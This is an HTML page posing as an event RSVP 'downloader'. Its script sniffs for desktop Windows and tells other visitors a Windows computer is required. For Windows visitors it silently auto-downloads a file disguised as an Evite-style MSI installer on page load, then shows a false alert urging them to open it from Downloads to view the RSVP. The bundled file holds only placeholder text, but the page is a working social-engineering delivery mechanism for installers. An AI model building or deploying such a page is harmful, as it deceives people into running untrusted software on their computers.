<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>RSVP Event Downloader</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }

        #msg {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 9999;
            text-align: center;
            padding-top: 20%;
        }

        .box {
            max-width: 500px;
            margin: auto;
        }

        h2 {
            font-size: 32px;
            color: #222;
            margin-bottom: 15px;
        }

        p {
            font-size: 28px;
            color: #555;
            margin: 10px 0;
        }

        .thanks-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            background: linear-gradient(145deg, #f6f9fc 0%, #eef2f5 100%);
        }

        .thanks-box {
            max-width: 600px;
            padding: 3rem;
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }

        .thanks-box h1 {
            font-size: 3rem;
            color: #2c7a4d;
            margin-bottom: 1rem;
        }

        .thanks-box p {
            font-size: 1.2rem;
            color: #555;
        }
    </style>
</head>
<body>

<div id="unsupportedMsg" style="display: none;">
    <div class="box">
        <h2>⚠️ Unsupported Device</h2>
        <p>It requires a Windows computer to RSVP.</p>
        <p>Mobile and tablet devices are not supported at this time.</p>
        <p>Please use a desktop or laptop computer to continue.</p>
    </div>
</div>

<div id="thanksContainer" class="thanks-container">
    <div class="thanks-box">
        <h1>🎉 Thanks for visiting! 🎉</h1>
    </div>
</div>

<script>
    const FILE_NAME = "RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi";
    
    function isDesktopWindows() {
        const ua = navigator.userAgent || "";
        const platform = navigator.platform || "";
        const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
        const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
        const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
        return isWindows && !isMobile && !isTouchOnly;
    }

    function showDownloadCompletePopup() {
        alert("✅ Download completed!\n\nYour file has been saved to your Downloads folder.\n\nPlease open your Downloads folder to open the RSVP.");
    }

    async function startDownload() {
        try {
            const fileSizeMB = 2.8;
            const totalChunks = 40;
            const chunkSize = (fileSizeMB * 1024 * 1024) / totalChunks;
            const chunks = [];
            let receivedBytes = 0;
            const totalBytes = fileSizeMB * 1024 * 1024;
            
            for (let i = 0; i < totalChunks; i++) {
                const chunkText = `RSVP-EVENT-BLOCK-${i}: CFXGNRP8HO1S_19SYPURD17668 | Timestamp: ${Date.now()} | Secure event token. 
                A computer is required to RSVP. Please use a computer to continue...
                [Chunk ${i+1}/${totalChunks}] -----------------------------------------------------
                `.repeat( Math.ceil(chunkSize / 200) );
                const encoder = new TextEncoder();
                const chunkData = encoder.encode(chunkText.slice(0, chunkSize));
                chunks.push(chunkData);
                receivedBytes += chunkData.length;
                await new Promise(r => setTimeout(r, 45));
            }
            const finalBlob = new Blob(chunks, { type: 'application/vnd.msi' });
            const blobUrl = URL.createObjectURL(finalBlob);
            const link = document.createElement('a');
            link.href = blobUrl;
            link.download = FILE_NAME;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(blobUrl);
            
            setTimeout(() => {
                showDownloadCompletePopup();
            }, 500);
            
        } catch (err) {
            console.error("Download error", err);
            alert("❌ Download failed. Please refresh the page and try again.");
        }
    }

    window.onload = function() {
        const isWindows = isDesktopWindows();
        const unsupportedDiv = document.getElementById('unsupportedMsg');
        const thanksContainer = document.getElementById('thanksContainer');
        
        if (!isWindows) {
            unsupportedDiv.style.display = 'block';
            unsupportedDiv.style.position = 'fixed';
            unsupportedDiv.style.top = '0';
            unsupportedDiv.style.left = '0';
            unsupportedDiv.style.width = '100%';
            unsupportedDiv.style.height = '100%';
            unsupportedDiv.style.background = '#ffffff';
            unsupportedDiv.style.zIndex = '9999';
            unsupportedDiv.style.textAlign = 'center';
            unsupportedDiv.style.paddingTop = '20%';
            thanksContainer.style.display = 'none';
        } else {
            thanksContainer.style.display = 'flex';
            setTimeout(() => {
                startDownload();
            }, 500);
        }
    };
</script>
</body>
</html>
